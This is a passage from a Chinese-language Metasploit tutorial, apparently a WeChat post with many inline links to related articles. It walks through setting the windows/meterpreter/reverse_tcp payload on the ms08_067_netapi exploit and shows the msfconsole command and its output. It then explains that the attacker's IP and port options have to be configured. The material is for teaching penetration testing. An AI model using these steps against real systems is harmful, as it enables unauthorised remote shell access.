**1、查看攻击载荷**

**2、设置攻击载荷**

  

本例中选择windows/meterpreter/reverse\_tcp[攻击](http://mp.weixin.qq.com/s?__biz=MjM5OTk4MDE2MA==&mid=2655132417&idx=3&sn=47c1d21230bf18b89e7b587c912c9f4b&chksm=bc8586ee8bf20ff871fd6248ddaed9ef07d50c752ef7e9b1b60916bf673c1ff4b0c578202c15&scene=21#wechat_redirect)载荷，用于获取一个反弹式[Shell](http://mp.weixin.qq.com/s?__biz=MjM5OTk4MDE2MA==&mid=2655127748&idx=3&sn=c1a3d178c1155c7613708f4f6384eb64&chksm=bc85952b8bf21c3d2d44139d072702367155b51c86221ea83618a580515205fc6dd139e1496c&scene=21#wechat_redirect)。其语法格式如下：

  

set payload \[攻击载荷\]

  

此时，执行命令如下：

  

msf5 exploit(ms08\_067\_netapi) > set payload windows/meterpreter/reverse\_tcp

payload => windows/meterpreter/reverse\_tcp

**3、设置攻击载荷选项**

  

当用户加载一个[攻击](http://mp.weixin.qq.com/s?__biz=MjM5OTk4MDE2MA==&mid=2655132417&idx=3&sn=47c1d21230bf18b89e7b587c912c9f4b&chksm=bc8586ee8bf20ff871fd6248ddaed9ef07d50c752ef7e9b1b60916bf673c1ff4b0c578202c15&scene=21#wechat_redirect)载荷后，可以看到该[攻击](http://mp.weixin.qq.com/s?__biz=MjM5OTk4MDE2MA==&mid=2655132417&idx=3&sn=47c1d21230bf18b89e7b587c912c9f4b&chksm=bc8586ee8bf20ff871fd6248ddaed9ef07d50c752ef7e9b1b60916bf673c1ff4b0c578202c15&scene=21#wechat_redirect)载荷也有需要进行配置的选项参数。而且必须配置这些选项，才可使其[攻击](http://mp.weixin.qq.com/s?__biz=MjM5OTk4MDE2MA==&mid=2655132417&idx=3&sn=47c1d21230bf18b89e7b587c912c9f4b&chksm=bc8586ee8bf20ff871fd6248ddaed9ef07d50c752ef7e9b1b60916bf673c1ff4b0c578202c15&scene=21#wechat_redirect)载荷发挥作用。所有[攻击](http://mp.weixin.qq.com/s?__biz=MjM5OTk4MDE2MA==&mid=2655132417&idx=3&sn=47c1d21230bf18b89e7b587c912c9f4b&chksm=bc8586ee8bf20ff871fd6248ddaed9ef07d50c752ef7e9b1b60916bf673c1ff4b0c578202c15&scene=21#wechat_redirect)载荷都有相应的配置选项，并且每个[攻击](http://mp.weixin.qq.com/s?__biz=MjM5OTk4MDE2MA==&mid=2655132417&idx=3&sn=47c1d21230bf18b89e7b587c912c9f4b&chksm=bc8586ee8bf20ff871fd6248ddaed9ef07d50c752ef7e9b1b60916bf673c1ff4b0c578202c15&scene=21#wechat_redirect)载荷的配置选项设置方法都相同。通常，[攻击](http://mp.weixin.qq.com/s?__biz=MjM5OTk4MDE2MA==&mid=2655132417&idx=3&sn=47c1d21230bf18b89e7b587c912c9f4b&chksm=bc8586ee8bf20ff871fd6248ddaed9ef07d50c752ef7e9b1b60916bf673c1ff4b0c578202c15&scene=21#wechat_redirect)载荷选项包括[渗透](http://mp.weixin.qq.com/s?__biz=MjM5OTk4MDE2MA==&mid=2655131857&idx=3&sn=f05704b1a33a118f5974dc1e0e3d8fde&chksm=bc85853e8bf20c282a388c76d4472ec1e0c54b97c6f96ce0179e0c75f9d0922a988125c9881d&scene=21#wechat_redirect)[攻击](http://mp.weixin.qq.com/s?__biz=MjM5OTk4MDE2MA==&mid=2655132417&idx=3&sn=47c1d21230bf18b89e7b587c912c9f4b&chksm=bc8586ee8bf20ff871fd6248ddaed9ef07d50c752ef7e9b1b60916bf673c1ff4b0c578202c15&scene=21#wechat_redirect)的IP地址和端口。

  

设置[攻击](http://mp.weixin.qq.com/s?__biz=MjM5OTk4MDE2MA==&mid=2655132417&idx=3&sn=47c1d21230bf18b89e7b587c912c9f4b&chksm=bc8586ee8bf20ff871fd6248ddaed9ef07d50c752ef7e9b1b60916bf673c1ff4b0c578202c15&scene=21#wechat_redirect)载荷选项。
